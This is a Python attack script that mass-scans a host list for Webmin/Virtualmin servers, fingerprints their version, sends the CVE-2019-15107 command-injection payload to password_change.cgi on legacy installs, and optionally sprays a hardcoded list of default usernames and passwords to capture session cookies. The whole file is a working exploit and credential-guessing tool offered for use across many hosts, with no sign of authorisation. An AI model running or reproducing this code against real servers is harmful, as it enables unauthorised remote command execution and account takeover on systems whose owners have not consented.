#!/usr/bin/env python3
"""Webmin/Virtualmin lane: version class + CVE-2019-15107 + weak creds.

Version class:
  >=2.0  login page loads /unauthenticated/css/bundle.min.css
  <2.0   legacy asset layout  -> CVE-2019-15107 (<1.920) / CVE-2019-12840 candidate
Only real command output counts as proof.
"""
import sys, re, json, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests, urllib3
urllib3.disable_warnings()

T = 10
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36"}
CREDS = [("admin", "admin"), ("root", "root"), ("admin", "password"),
         ("root", "password"), ("admin", "webmin"), ("root", "webmin"),
         ("admin", "123456"), ("root", "123456"), ("admin", "admin123"),
         ("root", "toor"), ("webmin", "webmin"), ("admin", "changeme")]

def s():
    x = requests.Session(); x.verify = False; x.headers.update(UA); return x

def one(host, do_creds=False):
    base = f"https://{host}"
    out = {"host": host}
    try:
        r = s().get(base + "/", timeout=T, allow_redirects=False)
    except Exception:
        return None
    h = str(r.headers).lower()
    txt = (r.text or "")
    if "miniserv" not in h and "webmin" not in txt.lower():
        return None
    out["server"] = r.headers.get("Server", "")[:40]
    out["modern"] = ("unauthenticated/css/bundle.min.css" in txt)
    m = re.search(r"MiniServ/([0-9.]+)", r.headers.get("Server", ""))
    if m:
        out["version"] = m.group(1)
    # classic backdoor (only on legacy layout)
    if not out["modern"]:
        try:
            x = requests.post(base + "/password_change.cgi",
                              data="user=root&pam=&expired=2&old=id&new1=a&new2=a",
                              headers={**UA, "Content-Type": "application/x-www-form-urlencoded",
                                       "Referer": base + "/session_login.cgi"},
                              timeout=T, verify=False)
            b = x.text or ""
            mm = re.search(r"uid=\d+\([a-z]+\)", b)
            if mm:
                out["proof"] = "CVE-2019-15107"
                out["evidence"] = mm.group(0)
                return out
        except Exception:
            pass
    if do_creds:
        for u, p in CREDS:
            try:
                ss = s()
                ss.get(base + "/session_login.cgi", timeout=T)
                g = ss.post(base + "/session_login.cgi",
                            data={"user": u, "pass": p, "save": "1"},
                            headers={"Referer": base + "/session_login.cgi",
                                     "Content-Type": "application/x-www-form-urlencoded"},
                            timeout=T, allow_redirects=False)
                sid = ss.cookies.get("sid")
                if g.status_code in (302, 303) and sid:
                    out["proof"] = f"WEAK_CREDS {u}:{p}"
                    out["sid"] = sid[:16] + "…"
                    return out
            except Exception:
                continue
    return out

def main():
    path = sys.argv[1]
    do_creds = "--creds" in sys.argv
    hosts = [l.strip() for l in open(path) if l.strip()]
    res, proven, lock = [], [], threading.Lock()
    n = 0
    with ThreadPoolExecutor(max_workers=150) as ex:
        futs = {ex.submit(one, h, do_creds): h for h in hosts}
        for f in as_completed(futs):
            n += 1
            try:
                r = f.result()
            except Exception:
                r = None
            if r:
                with lock:
                    res.append(r)
                if r.get("proof"):
                    with lock:
                        proven.append(r)
                    print(f"🔥 {json.dumps(r)[:260]}", flush=True)
            if n % 300 == 0:
                print(f"  .. {n}/{len(hosts)} fp={len(res)} proven={len(proven)}", flush=True)
    json.dump({"scanned": len(hosts), "found": res, "proven": proven},
              open("/tmp/webmin_result.json", "w"), indent=1)
    legacy = [r for r in res if not r.get("modern")]
    print(f"\nwebmin scanned={len(hosts)} live={len(res)} legacy={len(legacy)} PROVEN={len(proven)}", flush=True)

if __name__ == "__main__":
    main()
